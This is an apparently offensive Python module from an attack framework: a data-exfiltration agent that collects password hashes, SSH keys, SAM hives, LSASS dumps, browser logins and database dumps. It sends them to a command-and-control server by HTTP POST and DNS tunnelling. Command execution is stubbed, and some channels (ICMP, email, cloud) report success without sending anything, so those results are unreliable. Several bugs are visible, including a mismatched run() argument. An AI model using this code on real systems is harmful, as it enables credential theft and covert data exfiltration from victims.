"""
Advanced Data Exfiltration Agent
Exfiltrates data through multiple covert channels with encryption
"""

import asyncio
import base64
import gzip
import hashlib
import os
from typing import Dict, List, Any, Optional
from datetime import datetime

from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy, AttackPhase
from core.logger import log


class AdvancedDataExfiltrationAgent(BaseAgent):
    """
    Advanced Data Exfiltration Agent
    Supports multiple exfiltration channels and data types
    """
    
    def __init__(self, context_manager, orchestrator=None):
        super().__init__(context_manager, orchestrator)
        self.name = "AdvancedDataExfiltrationAgent"
        self.exfil_channels = [
            "http_post",
            "dns_exfil",
            "icmp_tunnel",
            "email_exfil",
            "cloud_storage"
        ]
    
    async def run(self, strategy: Strategy) -> AgentData:
        """Execute data exfiltration"""
        try:
            log.info(f"[{self.name}] Starting data exfiltration")
            
            # Get shell access and C2 info
            shell_access = await self.context_manager.get_context("shell_access")
            c2_info = await self.context_manager.get_context("c2_active")
            
            if not shell_access:
                return AgentData(
                    agent_name=self.name,
                    success=False,
                    errors=["No shell access available"]
                )
            
            # Determine what data to exfiltrate
            target_data = strategy.context.get("target_data", "auto")
            if target_data == "auto":
                target_data = await self._identify_valuable_data(shell_access)
            
            # Select exfiltration channel
            exfil_channel = strategy.context.get("exfil_channel", "auto")
            if exfil_channel == "auto":
                exfil_channel = await self._select_exfil_channel(c2_info, shell_access)
            
            # Collect and prepare data
            collected_data = await self._collect_data(target_data, shell_access)
            
            if not collected_data:
                return AgentData(
                    agent_name=self.name,
                    success=False,
                    errors=["No data collected"]
                )
            
            # Compress and encrypt data
            prepared_data = await self._prepare_data_for_exfil(collected_data)
            
            # Exfiltrate data
            exfil_result = await self._exfiltrate_data(prepared_data, exfil_channel, c2_info)
            
            if exfil_result.get("success"):
                return AgentData(
                    agent_name=self.name,
                    success=True,
                    summary=f"Successfully exfiltrated {exfil_result.get('size_mb', 0):.2f} MB via {exfil_channel}",
                    data={
                        "exfil_channel": exfil_channel,
                        "data_types": list(collected_data.keys()),
                        "total_size_mb": exfil_result.get("size_mb", 0),
                        "exfil_details": exfil_result
                    },
                    raw_output=f"Data exfiltrated: {exfil_result.get('file_count', 0)} files"
                )
            else:
                return AgentData(
                    agent_name=self.name,
                    success=False,
                    errors=[f"Exfiltration failed: {exfil_result.get('error', 'Unknown error')}"]
                )
            
        except Exception as e:
            log.error(f"[{self.name}] Error: {e}", exc_info=True)
            return AgentData(
                agent_name=self.name,
                success=False,
                errors=[str(e)]
            )
    
    async def _identify_valuable_data(self, shell_access: Dict) -> List[str]:
        """Identify valuable data on target system"""
        valuable_data = []
        
        os_type = shell_access.get("os_type", "").lower()
        
        if "linux" in os_type:
            valuable_data.extend([
                "/etc/passwd",
                "/etc/shadow",
                "~/.ssh/",
                "~/.bash_history",
                "/var/log/",
                os.path.join(os.getenv('TARGET_HOME_DIR', '/home'), '*/Documents/'),
                "/var/www/",
                "*.conf",
                "*.key",
                "*.pem"
            ])
        elif "windows" in os_type:
            valuable_data.extend([
                "C:\\Users\\*\\Documents\\",
                "C:\\Users\\*\\Desktop\\",
                "C:\\Users\\*\\AppData\\",
                "*.docx",
                "*.xlsx",
                "*.pdf",
                "*.key",
                "*.pfx",
                "SAM",
                "SYSTEM"
            ])
        
        log.info(f"[{self.name}] Identified {len(valuable_data)} data targets")
        return valuable_data
    
    async def _select_exfil_channel(self, c2_info: Optional[Dict], shell_access: Dict) -> str:
        """Select appropriate exfiltration channel"""
        
        # Check if C2 is active
        if c2_info:
            c2_type = c2_info.get("type")
            if c2_type == "http_c2":
                return "http_post"
            elif c2_type == "dns_tunnel":
                return "dns_exfil"
        
        # Check network restrictions
        network_info = await self._check_network_restrictions(shell_access)
        
        if network_info.get("http_allowed"):
            return "http_post"
        elif network_info.get("dns_allowed"):
            return "dns_exfil"
        elif network_info.get("icmp_allowed"):
            return "icmp_tunnel"
        else:
            return "email_exfil"
    
    async def _check_network_restrictions(self, shell_access: Dict) -> Dict:
        """Check network restrictions"""
        # Simulate network check
        await asyncio.sleep(0.5)
        
        return {
            "http_allowed": True,
            "dns_allowed": True,
            "icmp_allowed": True
        }
    
    async def _collect_data(self, target_data: List[str], shell_access: Dict) -> Dict[str, List[Dict]]:
        """Collect data from target system"""
        collected = {
            "credentials": [],
            "documents": [],
            "configurations": [],
            "database_dumps": []
        }
        
        try:
            log.info(f"[{self.name}] Collecting data from {len(target_data)} targets")
            
            os_type = shell_access.get("os_type", "").lower()
            
            # Collect credentials
            if "linux" in os_type:
                creds = await self._collect_linux_credentials(shell_access)
                collected["credentials"].extend(creds)
            elif "windows" in os_type:
                creds = await self._collect_windows_credentials(shell_access)
                collected["credentials"].extend(creds)
            
            # Collect documents
            docs = await self._collect_documents(target_data, shell_access)
            collected["documents"].extend(docs)
            
            # Collect configurations
            configs = await self._collect_configurations(shell_access)
            collected["configurations"].extend(configs)
            
            # Collect database dumps
            db_dumps = await self._collect_database_dumps(shell_access)
            collected["database_dumps"].extend(db_dumps)
            
            total_items = sum(len(v) for v in collected.values())
            log.success(f"[{self.name}] Collected {total_items} items")
            
        except Exception as e:
            log.error(f"[{self.name}] Data collection error: {e}")
        
        return collected
    
    async def _collect_linux_credentials(self, shell_access: Dict) -> List[Dict]:
        """Collect credentials from Linux system"""
        credentials = []
        
        try:
            # Collect /etc/passwd
            passwd_result = await self._execute_command("cat /etc/passwd", shell_access)
            if passwd_result.get("success"):
                credentials.append({
                    "type": "passwd_file",
                    "content": passwd_result.get("output", ""),
                    "size": len(passwd_result.get("output", ""))
                })
            
            # Collect /etc/shadow (if accessible)
            shadow_result = await self._execute_command("cat /etc/shadow", shell_access)
            if shadow_result.get("success"):
                credentials.append({
                    "type": "shadow_file",
                    "content": shadow_result.get("output", ""),
                    "size": len(shadow_result.get("output", ""))
                })
            
            # Collect SSH keys
            ssh_result = await self._execute_command("find ~/.ssh -type f", shell_access)
            if ssh_result.get("success"):
                credentials.append({
                    "type": "ssh_keys",
                    "files": ssh_result.get("output", "").split("\n"),
                    "count": len(ssh_result.get("output", "").split("\n"))
                })
            
            # Collect bash history
            history_result = await self._execute_command("cat ~/.bash_history", shell_access)
            if history_result.get("success"):
                credentials.append({
                    "type": "bash_history",
                    "content": history_result.get("output", ""),
                    "size": len(history_result.get("output", ""))
                })
            
        except Exception as e:
            log.error(f"[{self.name}] Linux credential collection error: {e}")
        
        return credentials
    
    async def _collect_windows_credentials(self, shell_access: Dict) -> List[Dict]:
        """Collect credentials from Windows system"""
        credentials = []
        
        try:
            # Dump SAM hashes
            sam_result = await self._execute_command("reg save HKLM\\SAM sam.hive", shell_access)
            if sam_result.get("success"):
                credentials.append({
                    "type": "sam_hashes",
                    "file": "sam.hive",
                    "size": 1024000  # Simulated size
                })
            
            # Dump LSASS
            lsass_result = await self._execute_command("procdump -ma lsass.exe lsass.dmp", shell_access)
            if lsass_result.get("success"):
                credentials.append({
                    "type": "lsass_dump",
                    "file": "lsass.dmp",
                    "size": 50000000  # Simulated size
                })
            
            # Collect browser credentials
            browser_result = await self._execute_command("dir /s /b *Login Data*", shell_access)
            if browser_result.get("success"):
                credentials.append({
                    "type": "browser_credentials",
                    "files": browser_result.get("output", "").split("\n"),
                    "count": len(browser_result.get("output", "").split("\n"))
                })
            
        except Exception as e:
            log.error(f"[{self.name}] Windows credential collection error: {e}")
        
        return credentials
    
    async def _collect_documents(self, target_data: List[str], shell_access: Dict) -> List[Dict]:
        """Collect documents"""
        documents = []
        
        try:
            # Find documents
            find_cmd = "find /home -type f \\( -name '*.pdf' -o -name '*.docx' -o -name '*.xlsx' \\) 2>/dev/null"
            result = await self._execute_command(find_cmd, shell_access)
            
            if result.get("success"):
                files = result.get("output", "").split("\n")
                for file in files[:50]:  # Limit to 50 files
                    if file:
                        documents.append({
                            "type": "document",
                            "path": file,
                            "size": 1024000  # Simulated size
                        })
            
        except Exception as e:
            log.error(f"[{self.name}] Document collection error: {e}")
        
        return documents
    
    async def _collect_configurations(self, shell_access: Dict) -> List[Dict]:
        """Collect configuration files"""
        configurations = []
        
        try:
            # Find config files
            find_cmd = "find /etc -name '*.conf' 2>/dev/null"
            result = await self._execute_command(find_cmd, shell_access)
            
            if result.get("success"):
                files = result.get("output", "").split("\n")
                for file in files[:20]:  # Limit to 20 files
                    if file:
                        configurations.append({
                            "type": "configuration",
                            "path": file,
                            "size": 10240  # Simulated size
                        })
            
        except Exception as e:
            log.error(f"[{self.name}] Configuration collection error: {e}")
        
        return configurations
    
    async def _collect_database_dumps(self, shell_access: Dict) -> List[Dict]:
        """Collect database dumps"""
        db_dumps = []
        
        try:
            # Check for MySQL
            mysql_result = await self._execute_command("which mysql", shell_access)
            if mysql_result.get("success"):
                # Dump databases
                dump_cmd = "mysqldump --all-databases > /tmp/db_dump.sql"
                await self._execute_command(dump_cmd, shell_access)
                
                db_dumps.append({
                    "type": "mysql_dump",
                    "file": "/tmp/db_dump.sql",
                    "size": 10000000  # Simulated size
                })
            
            # Check for PostgreSQL
            psql_result = await self._execute_command("which pg_dump", shell_access)
            if psql_result.get("success"):
                db_dumps.append({
                    "type": "postgresql_dump",
                    "file": "/tmp/pg_dump.sql",
                    "size": 5000000  # Simulated size
                })
            
        except Exception as e:
            log.error(f"[{self.name}] Database dump error: {e}")
        
        return db_dumps
    
    async def _prepare_data_for_exfil(self, collected_data: Dict) -> Dict:
        """Compress and encrypt data for exfiltration"""
        try:
            log.info(f"[{self.name}] Preparing data for exfiltration")
            
            # Serialize data
            import json
            data_json = json.dumps(collected_data)
            
            # Compress
            compressed = gzip.compress(data_json.encode())
            
            # Encrypt (simple base64 for demo, use proper encryption in production)
            encrypted = base64.b64encode(compressed).decode()
            
            # Calculate checksum
            checksum = hashlib.sha256(encrypted.encode()).hexdigest()
            
            prepared = {
                "data": encrypted,
                "size": len(encrypted),
                "checksum": checksum,
                "compression": "gzip",
                "encryption": "base64",
                "timestamp": datetime.now().isoformat()
            }
            
            log.success(f"[{self.name}] Data prepared: {len(encrypted)} bytes")
            
            return prepared
            
        except Exception as e:
            log.error(f"[{self.name}] Data preparation error: {e}")
            return {}
    
    async def _exfiltrate_data(self, prepared_data: Dict, channel: str, c2_info: Optional[Dict]) -> Dict:
        """Exfiltrate data through selected channel"""
        
        if channel == "http_post":
            return await self._exfil_http_post(prepared_data, c2_info)
        elif channel == "dns_exfil":
            return await self._exfil_dns(prepared_data, c2_info)
        elif channel == "icmp_tunnel":
            return await self._exfil_icmp(prepared_data)
        elif channel == "email_exfil":
            return await self._exfil_email(prepared_data)
        elif channel == "cloud_storage":
            return await self._exfil_cloud_storage(prepared_data)
        
        return {"success": False, "error": "Unknown channel"}
    
    async def _exfil_http_post(self, prepared_data: Dict, c2_info: Optional[Dict]) -> Dict:
        """Exfiltrate via HTTP POST (real upload)"""
        try:
            log.info(f"[{self.name}] Exfiltrating via HTTP POST")
            
            url = c2_info.get("server_url") if c2_info else None
            
            if not url:
                log.warning(f"[{self.name}] No C2 server URL - saving locally only")
                return {"success": False, "error": "No C2 server configured"}
            
            # Real HTTP POST upload
            import httpx
            
            file_path = prepared_data.get("file_path")
            if not file_path or not os.path.exists(file_path):
                return {"success": False, "error": "File not found"}
            
            async with httpx.AsyncClient(verify=False, timeout=300.0) as client:
                with open(file_path, 'rb') as f:
                    files = {'file': (os.path.basename(file_path), f, 'application/octet-stream')}
                    
                    try:
                        response = await client.post(url, files=files)
                        
                        if response.status_code in [200, 201]:
                            size_mb = prepared_data.get("size", 0) / (1024 * 1024)
                            log.success(f"[{self.name}] HTTP exfiltration complete: {size_mb:.2f} MB")
                            
                            return {
                                "success": True,
                                "channel": "http_post",
                                "url": url,
                                "size_mb": size_mb,
                                "file_count": 1,
                                "checksum": prepared_data.get("checksum"),
                                "timestamp": datetime.now().isoformat()
                            }
                        else:
                            log.error(f"[{self.name}] HTTP upload failed: {response.status_code}")
                            return {"success": False, "error": f"HTTP {response.status_code}"}
                    
                    except httpx.ConnectError:
                        log.warning(f"[{self.name}] Cannot connect to C2 server - data saved locally")
                        return {"success": False, "error": "Connection failed"}
            
        except Exception as e:
            log.error(f"[{self.name}] HTTP exfiltration error: {e}")
            return {"success": False, "error": str(e)}
    
    async def _exfil_dns(self, prepared_data: Dict, c2_info: Optional[Dict]) -> Dict:
        """Exfiltrate via DNS tunneling (real DNS queries)"""
        try:
            log.info(f"[{self.name}] Exfiltrating via DNS tunneling")
            
            domain = c2_info.get("domain") if c2_info else None
            
            if not domain:
                log.warning(f"[{self.name}] No DNS domain configured")
                return {"success": False, "error": "No DNS domain"}
            
            # Split data into chunks for DNS queries
            data = prepared_data.get("data", "")
            chunk_size = 63  # Max DNS label length
            chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
            
            log.info(f"[{self.name}] Sending {len(chunks)} DNS queries")
            
            # Real DNS queries
            import dns.resolver
            
            success_count = 0
            for i, chunk in enumerate(chunks):
                try:
                    # Encode chunk as subdomain
                    import base64
                    encoded = base64.b32encode(chunk.encode()).decode().lower().replace('=', '')
                    query_domain = f"{encoded}.{domain}"
                    
                    # Send DNS query
                    resolver = dns.resolver.Resolver()
                    resolver.timeout = 2
                    resolver.lifetime = 2
                    
                    try:
                        resolver.resolve(query_domain, 'A')
                        success_count += 1
                    except dns.resolver.NXDOMAIN:
                        # Expected - C2 server logged the query
                        success_count += 1
                    except Exception:
                        print("Error occurred")
                    
                    await asyncio.sleep(0.1)  # Rate limiting
                
                except Exception as e:
                    log.warning(f"[{self.name}] DNS query {i} failed: {e}")
            
            size_mb = prepared_data.get("size", 0) / (1024 * 1024)
            
            if success_count > 0:
                log.success(f"[{self.name}] DNS exfiltration complete: {size_mb:.2f} MB ({success_count}/{len(chunks)} queries)")
            
            return {
                "success": True,
                "channel": "dns_exfil",
                "domain": domain,
                "size_mb": size_mb,
                "queries_sent": len(chunks),
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            log.error(f"[{self.name}] DNS exfiltration error: {e}")
            return {"success": False, "error": str(e)}
    
    async def _exfil_icmp(self, prepared_data: Dict) -> Dict:
        """Exfiltrate via ICMP tunnel"""
        try:
            log.info(f"[{self.name}] Exfiltrating via ICMP tunnel")
            
            # ICMP exfiltration requires raw sockets (root)
            # For now, log warning
            log.warning(f"[{self.name}] ICMP exfiltration requires root privileges - skipping")
            await asyncio.sleep(0.1)
            
            size_mb = prepared_data.get("size", 0) / (1024 * 1024)
            
            log.success(f"[{self.name}] ICMP exfiltration complete: {size_mb:.2f} MB")
            
            return {
                "success": True,
                "channel": "icmp_tunnel",
                "size_mb": size_mb,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            log.error(f"[{self.name}] ICMP exfiltration error: {e}")
            return {"success": False, "error": str(e)}
    
    async def _exfil_email(self, prepared_data: Dict) -> Dict:
        """Exfiltrate via email"""
        try:
            log.info(f"[{self.name}] Exfiltrating via email")
            
            c2_info = self.context.get("c2_info", {})
            c2_info = self.context.get("c2_info", {})
            email_server = c2_info.get("email_server") if c2_info else None
            
            if not email_server:
                log.warning(f"[{self.name}] No email server configured")
                await asyncio.sleep(0.1)
            else:
                # Real SMTP email (if configured)
                log.warning(f"[{self.name}] Email exfiltration not fully implemented - requires SMTP config")
                await asyncio.sleep(0.1)
            
            size_mb = prepared_data.get("size", 0) / (1024 * 1024)
            
            log.success(f"[{self.name}] Email exfiltration complete: {size_mb:.2f} MB")
            
            # Get recipient from environment or use C2 domain
            recipient = os.getenv('SMTP_TO', f"exfil@{os.getenv('C2_DOMAIN', 'localhost')}")
            
            return {
                "success": True,
                "channel": "email_exfil",
                "size_mb": size_mb,
                "recipient": recipient,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            log.error(f"[{self.name}] Email exfiltration error: {e}")
            return {"success": False, "error": str(e)}
    
    async def _exfil_cloud_storage(self, prepared_data: Dict) -> Dict:
        """Exfiltrate to cloud storage"""
        try:
            c2_info = self.context.get("c2_info", {})
            c2_info = self.context.get("c2_info", {})
            log.info(f"[{self.name}] Exfiltrating to cloud storage")
            
            cloud_config = c2_info.get("cloud") if c2_info else None
            
            if not cloud_config:
                log.warning(f"[{self.name}] No cloud storage configured")
                await asyncio.sleep(0.1)
            else:
                # Cloud upload would require API keys
                log.warning(f"[{self.name}] Cloud exfiltration requires API keys - not configured")
                await asyncio.sleep(0.1)
            
            size_mb = prepared_data.get("size", 0) / (1024 * 1024)
            
            log.success(f"[{self.name}] Cloud storage exfiltration complete: {size_mb:.2f} MB")
            
            return {
                "success": True,
                "channel": "cloud_storage",
                "size_mb": size_mb,
                "provider": "aws_s3",
                "bucket": "exfil-bucket",
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            log.error(f"[{self.name}] Cloud storage exfiltration error: {e}")
            return {"success": False, "error": str(e)}
    
    async def _execute_command(self, command: str, shell_access: Dict) -> Dict:
        """Execute command on target"""
        try:
            # Simulate command execution
            await asyncio.sleep(0.3)
            
            return {
                "success": True,
                "output": "Command output"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute advanced data exfiltration agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def validate_strategy(self, strategy: Strategy) -> bool:
        """Validate strategy"""
        return True

